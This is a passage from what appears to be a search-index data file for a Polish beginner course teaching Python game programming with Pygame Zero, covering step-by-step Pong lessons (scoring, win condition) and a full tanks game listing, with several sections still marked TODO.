pionowej) mamy do wyboru dwie warto\u015bci: \\(-5\\) lub \\(5\\). Aby wylosowa\u0107 pomi\u0119dzy tymi dwiema warto\u015bciami skorzystamy z funkcji <code>random.choice</code>, do kt\u00f3rej podamy dwie warto\u015bci zamkni\u0119te w nawiasie kwadratowym i oddzielone przecinkiem (w ten spos\u00f3b tworzymy list\u0119, ale o listach powiemy sobie wi\u0119cej w p\u00f3\u017aniejszym temacie). Nasze losowanie b\u0119dzie wi\u0119c wygl\u0105da\u0142o nast\u0119puj\u0105co: <code>random.choice([-5, 5])</code>. Pozosta\u0142o nam przypisa\u0107 wyniki losowania do pr\u0119dko\u015bci pi\u0142ki.</p> <pre><code>def reset_ball():\n    ...\n\n    ball.vx = random.choice([-5, 5])\n    ball.vy = random.choice([-5, 5])\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#peny-kod_5","title":"Pe\u0142ny kod","text":"<p>Dotychczasowy pe\u0142ny kod naszej gry przedstawiony jest poni\u017cej.</p> <pre><code>import pgzrun\nimport random\n\nWIDTH = 800\nHEIGHT = 600\n\nTITLE = \"PONG\"\n\nbg_color = (64, 64, 64)\n\nleft = Actor(\"left\")\nleft.x = 20\nleft.y = HEIGHT / 2\nleft.vy = 5\n\nright = Actor(\"right\")\nright.x = WIDTH - 20\nright.y = HEIGHT / 2\nright.vy = 5\n\nball = Actor(\"ball\")\nball.x = WIDTH / 2\nball.y = HEIGHT / 2\n# Definiujemy pocz\u0105tkow\u0105 pr\u0119dko\u015b\u0107 pi\u0142ki\nball.vx = 5\nball.vy = 5\n\ndef draw():\n    screen.fill(bg_color)\n    screen.draw.line((WIDTH / 2, 40), (WIDTH / 2, HEIGHT - 40), color = \"yellow\")\n    left.draw()\n    right.draw()\n    ball.draw()\n\ndef update():\n    move_players()\n    # Poruszamy pi\u0142k\u0119\n    move_ball()\n\ndef move_players():\n    if keyboard.w and left.top &gt; 40:\n        left.y -= left.vy\n\n    if keyboard.s and left.bottom &lt; HEIGHT - 40:\n        left.y += left.vy\n\n    if keyboard.up and right.top &gt; 40:\n        right.y -= right.vy\n\n    if keyboard.down and right.bottom &lt; HEIGHT - 40:\n        right.y += right.vy\n\n# Pomocnicza funkcja obliczaj\u0105ca ruch pi\u0142ki i przemieszczaj\u0105ca j\u0105\ndef move_ball():\n    # Przemieszczamy pi\u0142k\u0119 zgodnie z jej pr\u0119dko\u015bci\u0105\n    ball.x += ball.vx\n    ball.y += ball.vy\n\n    # Odbijamy pi\u0142k\u0119 od g\u00f3rnej \u015bciany\n    if ball.top &lt;= 40:\n        ball.vy *= -1\n\n    # Odbijamy pi\u0142k\u0119 od dolnej \u015bciany\n    if ball.bottom &gt;= HEIGHT - 40:\n        ball.vy *= -1\n\n    # Odbijamy pi\u0142k\u0119 od lewej paletki\n    if left.colliderect(ball) and ball.vx &lt; 0:\n        ball.vx *= -1\n\n    # Odpijamy pi\u0142k\u0119 od prawej paletki\n    if right.colliderect(ball) and ball.vx &gt; 0:\n        ball.vx *= -1\n\n    # Je\u017celi pi\u0142ka wypad\u0142a z lewej strony\n    if ball.left &lt;= 0:\n        # Resetujemy pozycj\u0119 pi\u0142ki\n        reset_ball()\n\n    # Je\u017celi pi\u0142ka wypad\u0142a z prawej strony\n    if ball.right &gt;= WIDTH:\n        # Resetujemy pozycj\u0119 pi\u0142ki\n        reset_ball()\n\n# Pomocnicza funkcja resetuj\u0105ca pozycj\u0119 pi\u0142ki\ndef reset_ball():\n    # Okre\u015blamy pocz\u0105tkowe wsp\u00f3\u0142rz\u0119dne pi\u0142ki\n    ball.x = WIDTH / 2\n    ball.y = HEIGHT / 2\n    # Losowo wybieramy pocz\u0105tkow\u0105 pr\u0119dko\u015b\u0107 pi\u0142ki\n    ball.vx = random.choice([-5, 5])\n    ball.vy = random.choice([-5, 5])\n\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#punkty","title":"Punkty","text":"<p>Przyszed\u0142 czas na zliczanie punkt\u00f3w!</p>"},{"location":"learning-by-games/python/pygame-zero/pong/#zapamietujemy-punkty","title":"Zapami\u0119tujemy punkty","text":"<p>Punkty zdobyte przez graczy zapami\u0119tamy w paletkach. W tym celu dopisujemy do lewej i prawej paletki (zaraz pod ustaleniem ich pr\u0119dko\u015bci) zmienn\u0105 points z pocz\u0105tkow\u0105 warto\u015bci\u0105 \\(0\\): <code>left.points = 0</code> oraz <code>right.points = 0</code>.</p>"},{"location":"learning-by-games/python/pygame-zero/pong/#wyswietlamy-punkty","title":"Wy\u015bwietlamy punkty","text":"<p>Zanim przejdziemy do zliczania punkt\u00f3w wy\u015bwietlimy je na ekranie. By zachowa\u0107 porz\u0105dek i czytelno\u015b\u0107 kodu dodamy now\u0105 funkcj\u0119: <code>draw_points</code>. Dopiszemy j\u0105 zaraz pod cz\u0119\u015bci\u0105 rysuj\u0105c\u0105 (draw).</p> <pre><code>def draw_points():\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#punkty-lewego-gracza","title":"Punkty lewego gracza","text":"<p>Zacznijmy od wypisania punkt\u00f3w lewego gracza. Skorzystamy z funkcji <code>screen.draw.text</code>. Jako tekst podamy punkty lewego gracza (left.points) z dopiskiem \"Lewy: \": <code>f\"Lewy: {left.points}\"</code>. Kolor tekstu (color) ustawimy na \u017c\u00f3\u0142ty (yellow): <code>color=\"yellow\"</code>. \u015arodek tekstu (center) umie\u015bcimy z lewej strony ekranu, u g\u00f3ry: <code>center=(WIDTH / 4 - 20, 20)</code>. Jako rozmiar czcionki (fontsize) przyjmiemy warto\u015b\u0107 \\(48\\): <code>fontsize=48</code>.</p> <pre><code>def draw_points():\n    screen.draw.text(f\"Lewy: {left.points}\",\n                     color=\"yellow\",\n                     center=(WIDTH / 4 - 20, 20),\n                     fontsize=48)\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#punkty-prawego-gracza","title":"Punkty prawego gracza","text":"<p>Teraz wypiszmy punkty prawego gracza. Post\u0119pujmy podobnie, tylko jako pozycj\u0119 \u015brodka tekstu przyjmiemy praw\u0105, g\u00f3rn\u0105 stron\u0119 ekranu: <code>center=(WIDTH / 2 + WIDTH / 4 - 20, 20)</code>.</p> <pre><code>def draw_points():\n    screen.draw.text(f\"Lewy: {left.points}\",\n                     color=\"yellow\",\n                     center=(WIDTH / 4 - 20, 20),\n                     fontsize=48)\n\n    screen.draw.text(f\"Prawy: {right.points}\",\n                     color=\"yellow\",\n                     center=(WIDTH / 2 + WIDTH / 4 - 20, 20),\n                     fontsize=48)\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#wywoujemy-rysowanie-punktow","title":"Wywo\u0142ujemy rysowanie punkt\u00f3w","text":"<p>Pozosta\u0142o nam wywo\u0142a\u0107 nasz\u0105 funkcj\u0119 draw_points na ko\u0144cu cz\u0119\u015bci rysuj\u0105cej draw.</p> <pre><code>def draw():\n    ...\n\n    draw_points()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#zliczamy-punkty","title":"Zliczamy punkty","text":"<p>Gdy ju\u017c widzimy punkty na ekranie to mo\u017cemy przej\u015b\u0107 do ich zliczania. Punkty b\u0119dziemy zwi\u0119ksza\u0107, gdy pi\u0142ka wypadnie z lewej lub prawej strony ekranu. Lewy gracz dostanie punkt, gdy pi\u0142ka wypadnie z prawej strony, natomiast prawy gracz dostanie punkt, gdy pi\u0142ka wypadnie z lewej strony.</p> <p>Zwi\u0119kszanie punkt\u00f3w dopiszemy w cz\u0119\u015bci odpowiadaj\u0105cej za ruch pi\u0142ki (move_ball), zaraz pod instrukcjami sprawdzaj\u0105cymi, czy pi\u0142ka wypad\u0142a poza ekran.</p> <pre><code>def move_ball():\n    ...\n\n    if ball.left &lt;= 0:\n        reset_ball()\n        right.points += 1\n\n    if ball.right &gt;= WIDTH:\n        reset_ball()\n        left.points += 1 \n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#peny-kod_6","title":"Pe\u0142ny kod","text":"<p>Dotychczasowy pe\u0142ny kod naszej gry przedstawiony jest poni\u017cej.</p> <pre><code>import pgzrun\nimport random\n\nWIDTH = 800\nHEIGHT = 600\n\nTITLE = \"PONG\"\n\nbg_color = (64, 64, 64)\n\nleft = Actor(\"left\")\nleft.x = 20\nleft.y = HEIGHT / 2\nleft.vy = 5\n# Definiujemy punkty lewej paletki\nleft.points = 0\n\nright = Actor(\"right\")\nright.x = WIDTH - 20\nright.y = HEIGHT / 2\nright.vy = 5\n# Definiujemy punkty prawej paletki\nright.points = 0\n\nball = Actor(\"ball\")\nball.x = WIDTH / 2\nball.y = HEIGHT / 2\nball.vx = 5\nball.vy = 5\n\ndef draw():\n    screen.fill(bg_color)\n    screen.draw.line((WIDTH / 2, 40), (WIDTH / 2, HEIGHT - 40), color = \"yellow\")\n    left.draw()\n    right.draw()\n    ball.draw()\n    # Wypisujemy punkty\n    draw_points()\n\n# Pomocnicza funkcja wypisuj\u0105ca na ekranie punkty graczy\ndef draw_points():\n    # Wypisujemy wynik lewego gracza\n    screen.draw.text(f\"Lewy: {left.points}\",\n                     color=\"yellow\",\n                     center=(WIDTH / 4 - 20, 20),\n                     fontsize=48)\n\n    # Wypisujemy wynik prawego gracza\n    screen.draw.text(f\"Prawy: {right.points}\",\n                     color=\"yellow\",\n                     center=(WIDTH / 2 + WIDTH / 4 - 20, 20),\n                     fontsize=48)\n\ndef update():\n    move_players()\n    move_ball()\n\ndef move_players():\n    if keyboard.w and left.top &gt; 40:\n        left.y -= left.vy\n\n    if keyboard.s and left.bottom &lt; HEIGHT - 40:\n        left.y += left.vy\n\n    if keyboard.up and right.top &gt; 40:\n        right.y -= right.vy\n\n    if keyboard.down and right.bottom &lt; HEIGHT - 40:\n        right.y += right.vy\n\ndef move_ball():\n    ball.x += ball.vx\n    ball.y += ball.vy\n\n    if ball.top &lt;= 40:\n        ball.vy *= -1\n\n    if ball.bottom &gt;= HEIGHT - 40:\n        ball.vy *= -1\n\n    if left.colliderect(ball) and ball.vx &lt; 0:\n        ball.vx *= -1\n\n    if right.colliderect(ball) and ball.vx &gt; 0:\n        ball.vx *= -1\n\n    if ball.left &lt;= 0:\n        reset_ball()\n        # Prawy gracz dostaje punkt\n        right.points += 1\n\n    if ball.right &gt;= WIDTH:\n        reset_ball()\n        # Lewy gracz dostaje punkt\n        left.points += 1\n\ndef reset_ball():\n    ball.x = WIDTH / 2\n    ball.y = HEIGHT / 2\n    ball.vx = random.choice([-5, 5])\n    ball.vy = random.choice([-5, 5])\n\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#koniec-gry","title":"Koniec gry","text":"<p>Czas zaj\u0105\u0107 si\u0119 zako\u0144czeniem gry. Gra si\u0119 zako\u0144czy, gdy kt\u00f3ry\u015b z graczy uzyska \\(11\\) punkt\u00f3w. </p>"},{"location":"learning-by-games/python/pygame-zero/pong/#zapamietujemy-zwyciezce","title":"Zapami\u0119tujemy zwyci\u0119zc\u0119","text":"<p>Zaczniemy od zapami\u0119tania, kt\u00f3ra z paletek wygra\u0142a. W tym celu dopiszemy do lewej i prawej paletki zmienn\u0105 win z pocz\u0105tkow\u0105 warto\u015bci\u0105 False. Zmienne dopisujemy odpowiednio pod punktami lewej i prawej paletki: <code>left.win = False</code> oraz <code>right.win = False</code>.</p>"},{"location":"learning-by-games/python/pygame-zero/pong/#wyswietlamy-zwyciezce","title":"Wy\u015bwietlamy zwyci\u0119zc\u0119","text":"<p>Do wy\u015bwietlenia zwyci\u0119zcy na ekranie dopiszemy now\u0105 funkcj\u0119 draw_result. Dopiszemy j\u0105 zaraz pod funkcj\u0105 draw_points.</p> <pre><code>def draw_result():\n</code></pre> <p>Najpierw sprawdzimy, czy to lewy gracz jest zwyci\u0119zc\u0105.</p> <pre><code>def draw_result():\n    if left.win:\n</code></pre> <p>Je\u017celi tak, to wypisujemy stosowny komunikat na ekranie.</p> <pre><code>def draw_result():\n    if left.win:\n        screen.draw.text(\"LEWY WYGRYWA!!!\",\n                            color=\"yellow\",\n                            center=(WIDTH / 2, HEIGHT / 2),\n                            fontsize=96)\n</code></pre> <p>Teraz sprawdzamy, czy to prawa paletka wygra\u0142a.</p> <pre><code>def draw_result():\n    if left.win:\n        screen.draw.text(\"LEWY WYGRYWA!!!\",\n                            color=\"yellow\",\n                            center=(WIDTH / 2, HEIGHT / 2),\n                            fontsize=96)\n\n    if right.win:\n</code></pre> <p>Wypisujemy wi\u0119c stosowny komunikat na ekranie.</p> <pre><code>def draw_result():\n    if left.win:\n        screen.draw.text(\"LEWY WYGRYWA!!!\",\n                            color=\"yellow\",\n                            center=(WIDTH / 2, HEIGHT / 2),\n                            fontsize=96)\n\n    if right.win:\n        screen.draw.text(\"PRAWY WYGRYWA!!!\",\n                            color=\"yellow\",\n                            center=(WIDTH / 2, HEIGHT / 2),\n                            fontsize=96)\n</code></pre> <p>Teraz przysz\u0142a pora na wykorzystanie naszej funkcji. Dopisujemy wywo\u0142anie naszej funkcji na ko\u0144cu cz\u0119\u015bci rysuj\u0105cej (draw).</p> <pre><code>def draw():\n    ...\n\n    draw_result()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#ustalamy-zwyciezce","title":"Ustalamy zwyci\u0119zc\u0119","text":"<p>Zwyci\u0119zc\u0119 ustalimy w cz\u0119\u015bci przemieszczaj\u0105cej pi\u0142k\u0119 (move_ball) sprawdzaj\u0105c, czy kt\u00f3ry\u015b z graczy zdoby\u0142 \\(11\\) punkt\u00f3w. </p> <p>Najpierw sprawdzimy, czy prawa paletka uzyska\u0142a \\(11\\) punkt\u00f3w.</p> <pre><code>def move_ball():\n    ...\n\n    if right.points == 11:\n</code></pre> <p>Je\u017celi tak, to zmieniamy warto\u015b\u0107 jej zmiennej win na True.</p> <pre><code>def move_ball():\n    ...\n\n    if right.points == 11:\n        right.win = True\n</code></pre> <p>Podobnie post\u0119pujemy z lew\u0105 paletk\u0105.</p> <pre><code>def move_ball():\n    ...\n\n    if right.points == 11:\n        right.win = True\n\n    if left.points == 11:\n        left.win = True\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#zatrzymanie-gry","title":"Zatrzymanie gry","text":"<p>Gdy kt\u00f3ry\u015b z graczy uzyska \\(11\\) punkt\u00f3w gra powinna si\u0119 zatrzyma\u0107. W tym celu, w cz\u0119\u015bci aktualizuj\u0105cej (update) b\u0119dziemy aktualizowa\u0107 gr\u0119 tylko wtedy, gdy \u017caden z graczy jeszcze nie wygra\u0142. Zmieniamy wi\u0119c implementacj\u0119 funkcji update.</p> <p>W celu sprawdzenia, czy gra wci\u0105\u017c trwa, sprawdzimy, czy nieprawd\u0105 jest (not), \u017ce wygra\u0142 gracz lewy (left.win) lub (or) wygra\u0142 gracz prawy (right.win).</p> <pre><code>def update():\n    if not (left.win or right.win):\n</code></pre> <p>Teraz dopisujemy wywo\u0142ania naszych funkcji.</p> <pre><code>def update():\n    if not (left.win or right.win):\n        move_players()\n        move_ball()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#peny-kod_7","title":"Pe\u0142ny kod","text":"<p>Dotychczasowy pe\u0142ny kod naszej gry przedstawiony jest poni\u017cej.</p> <pre><code>import pgzrun\nimport random\n\nWIDTH = 800\nHEIGHT = 600\n\nTITLE = \"PONG\"\n\nbg_color = (64, 64, 64)\n\nleft = Actor(\"left\")\nleft.x = 20\nleft.y = HEIGHT / 2\nleft.vy = 5\nleft.points = 0\n# Zapami\u0119tujemy, czy lewa paletka jest zwyci\u0119zc\u0105\nleft.win = False\n\nright = Actor(\"right\")\nright.x = WIDTH - 20\nright.y = HEIGHT / 2\nright.vy = 5\nright.points = 0\n# Zapami\u0119tujemy, czy prawa paletka jest zwyci\u0119zc\u0105\nright.win = False\n\nball = Actor(\"ball\")\nball.x = WIDTH / 2\nball.y = HEIGHT / 2\nball.vx = 5\nball.vy = 5\n\ndef draw():\n    screen.fill(bg_color)\n    screen.draw.line((WIDTH / 2, 40), (WIDTH / 2, HEIGHT - 40), color = \"yellow\")\n    left.draw()\n    right.draw()\n    ball.draw()\n    draw_points()\n    # Wypisujemy wynik gry\n    draw_result()\n\ndef draw_points():\n    screen.draw.text(f\"Lewy: {left.points}\",\n                     color=\"yellow\",\n                     center=(WIDTH / 4 - 20, 20),\n                     fontsize=48)\n\n    screen.draw.text(f\"Prawy: {right.points}\",\n                     color=\"yellow\",\n                     center=(WIDTH / 2 + WIDTH / 4 - 20, 20),\n                     fontsize=48)\n\n# Pomocnicza funkcja wypisuj\u0105ca na ekranie wynik ko\u0144ca gry\ndef draw_result():\n    # Je\u017celi to lewy gracz wygra\u0142\n    if left.win:\n        screen.draw.text(\"LEWY WYGRYWA!!!\",\n                            color=\"yellow\",\n                            center=(WIDTH / 2, HEIGHT / 2),\n                            fontsize=96)\n\n    # Je\u017celi prawy gracz jest zwyci\u0119zc\u0105\n    if right.win:\n        screen.draw.text(\"PRAWY WYGRYWA!!!\",\n                            color=\"yellow\",\n                            center=(WIDTH / 2, HEIGHT / 2),\n                            fontsize=96) \n\ndef update():\n    # Je\u017celi gra nie zosta\u0142a jeszcze zako\u0144czona\n    if not (left.win or right.win):\n        move_players()\n        move_ball()\n\ndef move_players():\n    if keyboard.w and left.top &gt; 40:\n        left.y -= left.vy\n\n    if keyboard.s and left.bottom &lt; HEIGHT - 40:\n        left.y += left.vy\n\n    if keyboard.up and right.top &gt; 40:\n        right.y -= right.vy\n\n    if keyboard.down and right.bottom &lt; HEIGHT - 40:\n        right.y += right.vy\n\ndef move_ball():\n    ball.x += ball.vx\n    ball.y += ball.vy\n\n    if ball.top &lt;= 40:\n        ball.vy *= -1\n\n    if ball.bottom &gt;= HEIGHT - 40:\n        ball.vy *= -1\n\n    if left.colliderect(ball) and ball.vx &lt; 0:\n        ball.vx *= -1\n\n    if right.colliderect(ball) and ball.vx &gt; 0:\n        ball.vx *= -1\n\n    if ball.left &lt;= 0:\n        reset_ball()\n        right.points += 1\n\n    if ball.right &gt;= WIDTH:\n        reset_ball()\n        left.points += 1\n\n    # Je\u017celi prawa paletka uzyska\u0142a 11 punkt\u00f3w to wygrywa i gra si\u0119 ko\u0144czy\n    if right.points == 11:\n        right.win = True\n\n    # Je\u017celi lewa paletka uzyska\u0142a 11 punkt\u00f3w to wygrywa i gra si\u0119 ko\u0144czy\n    if left.points == 11:\n        left.win = True\n\ndef reset_ball():\n    ball.x = WIDTH / 2\n    ball.y = HEIGHT / 2\n    ball.vx = random.choice([-5, 5])\n    ball.vy = random.choice([-5, 5])\n\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/pong/#pena-gra","title":"Pe\u0142na gra","text":"<pre><code>import pgzrun\nimport random\n\n# Wymiary okna\nWIDTH = 800\nHEIGHT = 600\n\n# Tytu\u0142 gry\nTITLE = 'Pong'\n\n# Kolor t\u0142a\nbg_color = (64, 64, 64)\n\n# Tworzymy aktora lewej paletki\nleft = Actor(\"left\")\n# Okre\u015blamy pocz\u0105tkowe wsp\u00f3\u0142rz\u0119dne lewej paletki na ekranie\nleft.x = 20\nleft.y = HEIGHT / 2\n# Definiujemy pr\u0119dko\u015b\u0107 lewej paletki\nleft.vy = 5\n# Definiujemy punkty lewej paletki\nleft.points = 0\n# Zapami\u0119tujemy, czy lewa paletka jest zwyci\u0119zc\u0105\nleft.win = False\n\n# Tworzymy aktora prawej paletki\nright = Actor(\"right\")\n# Okre\u015blamy pocz\u0105tkowe wsp\u00f3\u0142rz\u0119dne prawej paletki na ekranie\nright.x = WIDTH - 20\nright.y = HEIGHT / 2\n# Definiujemy pr\u0119dko\u015b\u0107 prawej paletki\nright.vy = 5\n# Definiujemy punkty prawej paletki\nright.points = 0\n# Zapami\u0119tujemy, czy prawa paletka jest zwyci\u0119zc\u0105\nright.win = False\n\n# Tworzymy aktora pi\u0142ki\nball = Actor(\"ball\")\n# Okre\u015blamy pocz\u0105tkowe wsp\u00f3\u0142rz\u0119dne pi\u0142ki\nball.x = WIDTH / 2\nball.y = HEIGHT / 2\n# Definiujemy pocz\u0105tkow\u0105 pr\u0119dko\u015b\u0107 pi\u0142ki\nball.vx = 5\nball.vy = 5\n\ndef draw():\n    # Wype\u0142niamy ekran kolorem t\u0142a\n    screen.fill(bg_color)\n    # Rysujemy lini\u0119 dziel\u0105c\u0105 pole gry\n    screen.draw.line((WIDTH / 2, 40), (WIDTH / 2, HEIGHT - 40), color=\"yellow\")\n    # Rysujemy lew\u0105 paletk\u0119\n    left.draw()\n    # Rysujemy praw\u0105 paletk\u0119\n    right.draw()\n    # Rysujemy pi\u0142k\u0119\n    ball.draw()\n    # Wypisujemy punkty\n    draw_points()\n    # Wypisujemy wynik gry\n    draw_result()\n\n# Pomocnicza funkcja wypisuj\u0105ca na ekranie punkty graczy\ndef draw_points():\n    # Wypisujemy wynik lewego gracza\n    screen.draw.text(f\"Lewy: {left.points}\",\n                     color=\"yellow\",\n                     center=(WIDTH / 4 - 20, 20),\n                     fontsize=48)\n\n    # Wypisujemy wynik prawego gracza\n    screen.draw.text(f\"Prawy: {right.points}\",\n                     color=\"yellow\",\n                     center=(WIDTH / 2 + WIDTH / 4 - 20, 20),\n                     fontsize=48)\n\n# Pomocnicza funkcja wypisuj\u0105ca na ekranie wynik ko\u0144ca gry\ndef draw_result():\n    # Je\u017celi to lewy gracz wygra\u0142\n    if left.win:\n        screen.draw.text(\"LEWY WYGRYWA!!!\",\n                            color=\"yellow\",\n                            center=(WIDTH / 2, HEIGHT / 2),\n                            fontsize=96)\n\n    # Je\u017celi prawy gracz jest zwyci\u0119zc\u0105\n    if right.win: \n        screen.draw.text(\"PRAWY WYGRYWA!!!\",\n                            color=\"yellow\",\n                            center=(WIDTH / 2, HEIGHT / 2),\n                            fontsize=96)\n\n# Aktualizujemy stan gry - ruchy graczy i pi\u0142ki\ndef update():\n    # Je\u017celi gra nie zosta\u0142a jeszcze zako\u0144czona\n    if not (left.win or right.win):\n        # Odczytujemy ruchy graczy\n        move_players()\n        # Poruszamy pi\u0142k\u0119\n        move_ball()\n\n# Pomocnicza funkcja odczytuj\u0105ca ruchy graczy\ndef move_players():\n    # Lewy gracz porusza si\u0119 za pomoc\u0105 klawiszy w i s\n    if keyboard.w and left.top &gt; 40:\n        left.y -= left.vy\n\n    if keyboard.s and left.bottom &lt; HEIGHT - 40:\n        left.y += left.vy\n\n    # Prawy gracz porusza si\u0119 za pomoc\u0105 strza\u0142ek g\u00f3ra i d\u00f3\u0142\n    if keyboard.up and right.top &gt; 40:\n        right.y -= right.vy\n\n    if keyboard.down and right.bottom &lt; HEIGHT - 40:\n        right.y += right.vy\n\n# Pomocnicza funkcja obliczaj\u0105ca ruch pi\u0142ki i przemieszczaj\u0105ca j\u0105\ndef move_ball():\n    # Przemieszczamy pi\u0142k\u0119 zgodnie z jej pr\u0119dko\u015bci\u0105\n    ball.x += ball.vx\n    ball.y += ball.vy\n\n    # Odbijamy pi\u0142k\u0119 od g\u00f3rnej \u015bciany\n    if ball.top &lt;= 40:\n        ball.vy *= -1\n\n    # Odbijamy pi\u0142k\u0119 od dolnej \u015bciany\n    if ball.bottom &gt;= HEIGHT - 40:\n        ball.vy *= -1\n\n    # Odbijamy pi\u0142k\u0119 od lewej paletki\n    if left.colliderect(ball) and ball.vx &lt; 0:\n        ball.vx *= -1\n\n    # Odpijamy pi\u0142k\u0119 od prawej paletki\n    if right.colliderect(ball) and ball.vx &gt; 0:\n        ball.vx *= -1\n\n    # Je\u017celi pi\u0142ka wypad\u0142a z lewej strony\n    if ball.left &lt;= 0:\n        # Resetujemy pozycj\u0119 pi\u0142ki\n        reset_ball()\n        # Prawy gracz dostaje punkt\n        right.points += 1\n\n    # Je\u017celi pi\u0142ka wypad\u0142a z prawej strony\n    if ball.right &gt;= WIDTH:\n        # Resetujemy pozycj\u0119 pi\u0142ki\n        reset_ball()\n        # Lewy gracz dostaje punkt\n        left.points += 1\n\n    # Je\u017celi prawa paletka uzyska\u0142a 11 punkt\u00f3w to wygrywa i gra si\u0119 ko\u0144czy\n    if right.points == 11:\n        right.win = True\n\n    # Je\u017celi lewa paletka uzyska\u0142a 11 punkt\u00f3w to wygrywa i gra si\u0119 ko\u0144czy\n    if left.points == 11:\n        left.win = True\n\n# Pomocnicza funkcja resetuj\u0105ca pozycj\u0119 pi\u0142ki\ndef reset_ball():\n    # Okre\u015blamy pocz\u0105tkowe wsp\u00f3\u0142rz\u0119dne pi\u0142ki\n    ball.x = WIDTH / 2\n    ball.y = HEIGHT / 2\n    # Losowo wybieramy pocz\u0105tkow\u0105 pr\u0119dko\u015b\u0107 pi\u0142ki\n    ball.vx = random.choice([-5, 5])\n    ball.vy = random.choice([-5, 5])\n\npgzrun.go()\n</code></pre> <p>Pe\u0142na implementacja dost\u0119pna jest r\u00f3wnie\u017c poni\u017cej.</p> <p>Pong</p>"},{"location":"learning-by-games/python/pygame-zero/snake/","title":"Snake","text":""},{"location":"learning-by-games/python/pygame-zero/snake/#pena-gra","title":"Pe\u0142na gra","text":"<p>Snake</p>"},{"location":"learning-by-games/python/pygame-zero/tanks-1/","title":"Czo\u0142gi 1","text":""},{"location":"learning-by-games/python/pygame-zero/tanks-1/#wstep","title":"Wst\u0119p","text":"<p>TODO</p>"},{"location":"learning-by-games/python/pygame-zero/tanks-1/#czego-sie-nauczysz","title":"Czego si\u0119 nauczysz","text":"<p>TODO</p>"},{"location":"learning-by-games/python/pygame-zero/tanks-1/#grafiki-do-gry","title":"Grafiki do gry","text":"<p> Grafiki do gry Czo\u0142gi 1</p>"},{"location":"learning-by-games/python/pygame-zero/tanks-1/#gra","title":"Gra","text":"<p>TODO</p>"},{"location":"learning-by-games/python/pygame-zero/tanks-1/#peen-program","title":"Pe\u0142en program","text":"<pre><code>import pgzrun\nimport math\nimport random\n\nWIDTH = 800\nHEIGHT = 600\n\nczolg = Actor(\"czolg.png\")\nczolg.x = WIDTH / 2\nczolg.y = HEIGHT / 2\nczolg.poziom = 1\nczolg.poc_v = 3\nczolg.odl_x = WIDTH\nczolg.odl_y = HEIGHT\nczolg.wrog_kat = 90\nczolg.zycie = 1\nczolg.punkty = 0\n\nlufa = Actor(\"lufa.png\", anchor=(\"middle\", \"bottom\"))\nlufa.x = WIDTH / 2\nlufa.y = HEIGHT / 2\nlufa.v = 3\n\nmedal = Actor(\"medal1.png\")\nmedal.x = 50\nmedal.y = 50\n\npociski = []\n\nwrogowie = []\n\ndef draw():\n    screen.fill((255, 255, 255))\n\n    for wrog in wrogowie:\n        wrog.draw()\n\n    for p in pociski:\n        p.draw()\n\n    czolg.draw()\n\n    if czolg.zycie == 1:\n        lufa.draw()\n\n    if czolg.zycie == 0:\n        screen.draw.text(\"GAME OVER\", center=(WIDTH / 2, HEIGHT / 2 - 200), fontsize=100, color=\"red\")\n\n    if czolg.punkty &gt;= 10:\n        if czolg.punkty &gt;= 30:\n            medal.image = \"medal3\"\n        elif czolg.punkty &gt;= 20:\n            medal.image = \"medal2\"\n\n        medal.draw()\n\ndef update():\n    if keyboard.LEFT and not keyboard.SPACE:\n        lufa.angle += lufa.v\n    if keyboard.RIGHT and not keyboard.SPACE:\n        lufa.angle -= lufa.v\n\n    for poc in pociski:\n        poc.x += math.sin(math.radians(poc.angle - 180)) * poc.v\n        poc.y += math.cos(math.radians(poc.angle - 180)) * poc.v\n\n    if random.randint(0, 200) &lt; czolg.poziom:\n        wrog = Actor(\"wrog1.png\")\n        kat = random.randint(0, 360)\n        wrog.x = WIDTH / 2 + math.sin(math.radians(kat)) * czolg.odl_x\n        wrog.y = HEIGHT / 2 + math.cos(math.radians(kat)) * czolg.odl_y\n        wrog.v = 2\n        wrogowie.append(wrog)\n\n    for wrog in wrogowie:\n        wrog.angle = wrog.angle_to(czolg) + czolg.wrog_kat\n        wrog.x += math.sin(math.radians(wrog.angle)) * wrog.v\n        wrog.y += math.cos(math.radians(wrog.angle)) * wrog.v\n        if wrog.colliderect(czolg):\n            czolg.zycie = 0\n            czolg.image = \"wybuch1.png\"\n\n    for poc in pociski:\n        for wrog in wrogowie:\n            if poc.colliderect(wrog):\n                wrogowie.remove(wrog)\n                pociski.remove(poc)\n                czolg.punkty += 2\n                break\n\ndef on_key_down(key):\n    if key == keys.SPACE and czolg.zycie == 1:\n        poc = Actor(\"pocisk.png\")\n        poc.angle = lufa.angle\n        poc.x = lufa.x\n        poc.y = lufa.y\n        poc.v = czolg.poc_v\n        pociski.append(poc)\n\ndef nastepny_poziom():\n    czolg.poc_v += 0.25\n    czolg.poziom += 1\n    if czolg.poziom &gt;= 5:\n        czolg.odl_x = WIDTH / 2 - czolg.poziom * 2\n        czolg.odl_y = HEIGHT / 2 - czolg.poziom * 2\n        czolg.wrog_kat = 170\n\nclock.schedule_interval(nastepny_poziom, 8)\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/tanks-1/#testujemy-dziaanie","title":"Testujemy dzia\u0142anie","text":"<p>TODO</p>"},{"location":"learning-by-games/python/pygame-zero/tanks-2/","title":"Czo\u0142gi 2","text":""},{"location":"learning-by-games/python/pygame-zero/tanks-2/#wstep","title":"Wst\u0119p","text":"<p>TODO</p>"},{"location":"learning-by-games/python/pygame-zero/tanks-2/#czego-sie-nauczysz","title":"Czego si\u0119 nauczysz","text":"<p>TODO</p>"},{"location":"learning-by-games/python/pygame-zero/tanks-2/#grafiki-do-gry","title":"Grafiki do gry","text":"<p> Grafiki do gry Czo\u0142gi 2</p>"},{"location":"learning-by-games/python/pygame-zero/tanks-2/#gra","title":"Gra","text":"<p>TODO</p>"},{"location":"learning-by-games/python/pygame-zero/tanks-2/#peen-program","title":"Pe\u0142en 